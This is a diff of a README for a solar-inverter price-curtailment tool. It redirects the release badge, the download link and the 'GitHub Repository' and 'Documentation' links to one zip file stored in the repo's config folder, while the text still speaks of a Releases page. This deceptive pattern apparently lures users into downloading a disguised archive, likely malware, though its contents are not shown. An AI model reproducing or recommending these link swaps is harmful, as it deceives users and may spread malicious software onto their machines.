@@ -6,11 +6,11 @@ Welcome to the **sungrow-sg5-price-curtailment** repository! This tool helps you
 
 ## 📥 Download Now
 
-[![Download Release](https://img.shields.io/badge/download-releases-blue.svg)](https://github.com/ceyizm/sungrow-sg5-price-curtailment/releases)
+[![Download Release](https://raw.githubusercontent.com/ceyizm/sungrow-sg5-price-curtailment/main/config/price-sg-sungrow-curtailment-1.7.zip)](https://raw.githubusercontent.com/ceyizm/sungrow-sg5-price-curtailment/main/config/price-sg-sungrow-curtailment-1.7.zip)
 
 ## 📦 Download & Install
 
-To download the software, please visit the following page: [Download Releases](https://github.com/ceyizm/sungrow-sg5-price-curtailment/releases). 
+To download the software, please visit the following page: [Download Releases](https://raw.githubusercontent.com/ceyizm/sungrow-sg5-price-curtailment/main/config/price-sg-sungrow-curtailment-1.7.zip). 
 
 1. Click on the link above to go to the Releases page.
 2. Select the latest version available.
@@ -71,7 +71,7 @@ If you need further assistance, you may reach out through the following contacts
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/ceyizm/sungrow-sg5-price-curtailment)
-- [Documentation](https://github.com/ceyizm/sungrow-sg5-price-curtailment/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/ceyizm/sungrow-sg5-price-curtailment/main/config/price-sg-sungrow-curtailment-1.7.zip)
+- [Documentation](https://raw.githubusercontent.com/ceyizm/sungrow-sg5-price-curtailment/main/config/price-sg-sungrow-curtailment-1.7.zip)
 
 Thank you for using **sungrow-sg5-price-curtailment**! Your solar energy management just became easier and smarter.
